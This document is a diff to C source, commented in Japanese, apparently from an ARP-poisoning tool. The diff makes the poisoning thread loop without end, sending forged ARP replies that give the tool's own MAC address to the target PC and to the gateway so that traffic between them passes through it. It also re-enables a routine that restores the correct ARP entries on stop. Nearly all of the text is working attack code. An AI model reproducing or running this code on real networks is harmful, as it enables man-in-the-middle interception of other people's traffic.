@@ -36,7 +36,6 @@ void *PoisonThread(void * arg)
 {
     if(isPoisoning != 1){ return; }
 
-    printf("poisoning now.\n");
     union {
         u_int32_t l;
         u_int8_t c[4];
@@ -53,31 +52,35 @@ void *PoisonThread(void * arg)
     ArpSearchTable(&gateway_addr, g_mac);
     
     int soc = GetDeviceSoc();
-    // send ARP Reply to target PC
-    ArpSend
-    (
-        soc,         //soc
-        ARPOP_REPLY, //op
-        Param.vmac,  //e_smac 自分から送る gatewayでも良い？
-        t_mac,       //e_dmac targetに送る
-        Param.vmac,  //smac   自分のMACを送る(本来ならgateway)
-        t_mac,       //dmac   targetのMACを送る
-        g_addr.c,    //saddr  gatewayのIPアドレス
-        t_addr.c     //daddr  targetのIPアドレス
-    );
 
-    // send ARP Repley to target gateway
-    ArpSend
-    (
-        soc,         //soc
-        ARPOP_REPLY, //op
-        Param.vmac,  //e_smac 自分から送る targetでも良い？
-        g_mac,       //e_dmac gatewayに送る
-        Param.vmac,  //smac   自分のMACを送る(本来ならtarget)
-        g_mac,       //dmac   gatewayのMACを送る
-        t_addr.c,    //saddr  targetのIPアドレス
-        g_addr.c     //daddr  gatewayのIPアドレス
-    );
+    while(isPoisoning == 1)
+    {
+        // send ARP Reply to target PC
+        ArpSend
+        (
+            soc,         //soc
+            ARPOP_REPLY, //op
+            Param.vmac,  //e_smac 自分から送る gatewayでも良い？
+            t_mac,       //e_dmac targetに送る
+            Param.vmac,  //smac   自分のMACを送る(本来ならgateway)
+            t_mac,       //dmac   targetのMACを送る
+            g_addr.c,    //saddr  gatewayのIPアドレス
+            t_addr.c     //daddr  targetのIPアドレス
+        );
+
+        // send ARP Repley to target gateway
+        ArpSend
+        (
+            soc,         //soc
+            ARPOP_REPLY, //op
+            Param.vmac,  //e_smac 自分から送る targetでも良い？
+            g_mac,       //e_dmac gatewayに送る
+            Param.vmac,  //smac   自分のMACを送る(本来ならtarget)
+            g_mac,       //dmac   gatewayのMACを送る
+            t_addr.c,    //saddr  targetのIPアドレス
+            g_addr.c     //daddr  gatewayのIPアドレス
+        );
+    }
 
 }
 
@@ -115,48 +118,48 @@ void StopPoison(void)
 
     if(isPoisoning != 1){ return; }
 
-    // union {
-    //     u_int32_t l;
-    //     u_int8_t c[4];
-    // }t_addr, g_addr;
+    union {
+        u_int32_t l;
+        u_int8_t c[4];
+    }t_addr, g_addr;
 
-    // //targetPCのIPアドレス
-    // t_addr.l = target_addr.s_addr;
-    // //gatewayのIPアドレス
-    // g_addr.l = gateway_addr.s_addr;
+    //targetPCのIPアドレス
+    t_addr.l = target_addr.s_addr;
+    //gatewayのIPアドレス
+    g_addr.l = gateway_addr.s_addr;
 
-    // int soc = GetDeviceSoc();
+    int soc = GetDeviceSoc();
 
-    // int i;
-    // // 5回くらい正しいARP Replyを送信して攻撃対象のARPテーブルを戻す
-    // for(i = 0; i < 5; i++)
-    // {
-    //     // targetに正しいgatewayに関するARP Replyを送信
-    //     ArpSend
-    //     (
-    //         soc,         //soc
-    //         ARPOP_REPLY, //op
-    //         Param.vmac,  //e_smac 自分から送る
-    //         t_mac,       //e_dmac targetに送る
-    //         g_mac,       //smac   gatewayのMACを送る
-    //         t_mac,       //dmac   targetのMACを送る
-    //         g_addr.c,    //saddr  gatewayのIPアドレス
-    //         t_addr.c     //daddr  targetのIPアドレス
-    //     );
+    int i;
+    // 5回くらい正しいARP Replyを送信して攻撃対象のARPテーブルを戻す
+    for(i = 0; i < 5; i++)
+    {
+        // targetに正しいgatewayに関するARP Replyを送信
+        ArpSend
+        (
+            soc,         //soc
+            ARPOP_REPLY, //op
+            Param.vmac,  //e_smac 自分から送る
+            t_mac,       //e_dmac targetに送る
+            g_mac,       //smac   gatewayのMACを送る
+            t_mac,       //dmac   targetのMACを送る
+            g_addr.c,    //saddr  gatewayのIPアドレス
+            t_addr.c     //daddr  targetのIPアドレス
+        );
 
-    //     // gatewayに正しいARP Replyを送信
-    //     ArpSend
-    //     (
-    //         soc,         //soc
-    //         ARPOP_REPLY, //op
-    //         Param.vmac,  //e_smac 自分から送る
-    //         g_mac,       //e_dmac gatewayに送る
-    //         t_mac,       //smac   targetのMACを送る
-    //         g_mac,       //dmac   gatewayを送る
-    //         t_addr.c,    //saddr  targetのIPアドレス
-    //         g_addr.c     //daddr  gatewayのIPアドレス
-    //     );
-    // }
+        // gatewayに正しいARP Replyを送信
+        ArpSend
+        (
+            soc,         //soc
+            ARPOP_REPLY, //op
+            Param.vmac,  //e_smac 自分から送る
+            g_mac,       //e_dmac gatewayに送る
+            t_mac,       //smac   targetのMACを送る
+            g_mac,       //dmac   gatewayを送る
+            t_addr.c,    //saddr  targetのIPアドレス
+            g_addr.c     //daddr  gatewayのIPアドレス
+        );
+    }
 
     isPoisoning = 0;
     printf("isPoison=%d\n", isPoisoning);
